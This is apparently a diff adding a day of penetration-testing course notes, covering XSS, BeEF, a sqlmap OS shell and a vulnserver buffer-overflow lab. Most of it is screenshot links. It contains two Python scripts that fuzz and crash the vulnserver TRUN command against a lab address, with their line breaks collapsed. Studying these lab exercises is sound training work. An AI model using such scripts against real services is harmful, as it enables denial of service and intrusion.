@@ -996,17 +996,11 @@ https://beefproject.com/
 
 ![](assets/2022-08-30-19-40-00-image.png)
 
-
-
 > From HERBAIN BOGNON to Everyone: Launch the web server with <mark>npm start </mark>in the webapp folder then open a web browser to localhost:3000
-
-
 
 ![](assets/2022-08-30-19-11-19-image.png)
 
 ![](assets/2022-08-30-19-13-07-image.png)
-
-
 
 ![](assets/2022-08-30-19-14-40-image.png)
 
@@ -1094,6 +1088,238 @@ locate webshell
 
 ![](assets/2022-08-30-20-59-30-image.png)
 
-
-
 ![](assets/2022-08-30-21-01-17-image.png)
+
+---
+
+### Day 9 – Buffer Overflow
+
+```
+Check the security.txt if there's information about the bug bounty (same as robots.txt)
+```
+
+![](assets/2022-08-31-19-11-34-image.png)
+
+![](assets/2022-08-31-19-12-42-image.png)
+
+![](assets/2022-08-31-19-14-12-image.png)
+
+![](assets/2022-08-31-19-19-42-image.png)
+
+![](assets/2022-08-31-19-23-13-image.png)
+
+![](assets/2022-08-31-19-23-44-image.png)
+
+![](assets/2022-08-31-19-23-55-image.png)
+
+
+
+Steps:
+
+1. Crosssite Scripting
+
+2. Session Hijacking
+
+
+
+![](assets/2022-08-31-19-26-01-image.png)
+
+
+
+> **What is BeEF?**
+> 
+> BeEF is short for The Browser Exploitation Framework. It is a
+>  penetration testing tool that focuses on the web browser.
+
+https://beefproject.com/
+
+
+
+![](assets/2022-08-31-19-32-05-image.png)
+
+![](assets/2022-08-31-19-33-37-image.png)
+
+![](assets/2022-08-31-19-35-54-image.png)
+
+![](assets/2022-08-31-19-36-02-image.png)
+
+![](assets/2022-08-31-19-38-30-image.png)
+
+![](assets/2022-08-31-19-38-42-image.png)
+
+![](assets/2022-08-31-19-40-54-image.png)
+
+![](assets/2022-08-31-19-41-40-image.png)
+
+![](assets/2022-08-31-19-43-37-image.png)
+
+![](assets/2022-08-31-19-44-49-image.png)
+
+![](assets/2022-08-31-19-45-57-image.png)
+
+![](assets/2022-08-31-19-46-07-image.png)
+
+![](assets/2022-08-31-19-47-06-image.png)
+
+![](assets/2022-08-31-19-47-31-image.png)
+
+![](assets/2022-08-31-19-50-27-image.png)
+
+![](assets/2022-08-31-19-51-11-image.png)
+
+![](assets/2022-08-31-19-52-56-image.png)
+
+![](assets/2022-08-31-19-53-43-image.png)
+
+
+
+**sqlmap OS shell upload**
+
+![](assets/2022-08-31-19-55-27-image.png)
+
+![](assets/2022-08-31-19-54-34-image.png)
+
+![](assets/2022-08-31-19-55-38-image.png)
+
+**VM he used**
+
+```
+https://www.vulnhub.com/entry/pentester-lab-xss-and-mysql-file,66/
+```
+
+
+
+**Buffer Overflow**
+
+![](assets/2022-08-31-20-11-54-image.png)
+
+```
+https://github.com/stephenbradshaw/vulnserver
+```
+
+![](assets/2022-08-31-20-14-26-image.png)
+
+```
+https://immunityinc.com/products/debugger/
+```
+
+![](assets/2022-08-31-20-14-42-image.png)
+
+![](assets/2022-08-31-20-17-38-image.png)
+
+![](assets/2022-08-31-20-18-29-image.png)
+
+![](assets/2022-08-31-20-18-44-image.png)
+
+
+
+Code:
+
+
+
+```
+#!/usr/bin/pythonimport socketimport osimport sysimport timehost="10.211.55.7"port=4444buffer=["A"]counter=100while len(buffer) <= 30:                buffer.append("A"*counter)                counter=counter+200for string in buffer:        print "fuzzing TRUN with %s bytes" % len(string)        expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        expl.connect((host, port))        expl.send("TRUN /.:/" + string)        expl.close()	time.sleep(1)
+
+```
+
+
+
+![](assets/2022-08-31-20-20-12-image.png)
+
+![](assets/2022-08-31-20-20-38-image.png)
+
+
+
+**Menu -> File -> Attach**
+
+![](assets/2022-08-31-20-21-28-image.png)
+
+![](assets/2022-08-31-20-21-57-image.png)
+
+**Click "Play" Button**
+
+![](assets/2022-08-31-20-22-19-image.png)
+
+![](assets/2022-08-31-20-25-14-image.png)
+
+![](assets/2022-08-31-20-27-20-image.png)
+
+![](assets/2022-08-31-20-27-36-image.png)
+
+
+
+**Lead to DDoS**
+
+![](assets/2022-08-31-20-29-25-image.png)
+
+
+
+[Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
+
+
+
+
+
+![](assets/2022-08-31-20-32-30-image.png)
+
+```
+#!/usr/bin/pythonimport socketimport osimport syshost="10.211.55.7"port=4444buffer = "TRUN /.:/" + "A" * 5900expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)expl.connect((host, port))expl.send(buffer)expl.close()
+
+```
+
+![](assets/2022-08-31-20-34-39-image.png)
+
+![](assets/2022-08-31-20-35-06-image.png)
+
+![](assets/2022-08-31-20-35-24-image.png)
+
+![](assets/2022-08-31-20-35-35-image.png)
+
+![](assets/2022-08-31-20-36-38-image.png)
+
+![](assets/2022-08-31-20-36-47-image.png)
+
+![](assets/2022-08-31-20-37-03-image.png)
+
+![](assets/2022-08-31-20-37-21-image.png)
+
+```
+https://shell-storm.org/shellcode/
+```
+
+![](assets/2022-08-31-20-40-22-image.png)
+
+**Restart Server**
+
+![](assets/2022-08-31-20-41-38-image.png)
+
+**Restart Immunity Debugger**
+
+![](assets/2022-08-31-20-42-07-image.png)
+
+![](assets/2022-08-31-20-46-01-image.png)
+
+![](assets/2022-08-31-20-46-59-image.png)
+
+![](assets/2022-08-31-20-50-27-image.png)
+
+![](assets/2022-08-31-20-50-39-image.png)
+
+![](assets/2022-08-31-20-50-51-image.png)
+
+**Avoid ASLR (Memory Protection)**
+
+![](assets/2022-08-31-20-52-01-image.png)
+
+> From Chat:
+> 
+> from quick search in Google: What is ASLR in operating system?
+> ASLR MEANING Address Space Layout Randomization (ASLR) is a computer security technique which involves randomly positioning the base address of an executable and the position of libraries, heap, and stack, in a process's address space.
+
+
+
+- LiveOverflow on youtube
+
+- Plus the Tryhackme Buffer Overflow Prep room
+
+- Also consider learning pwntools
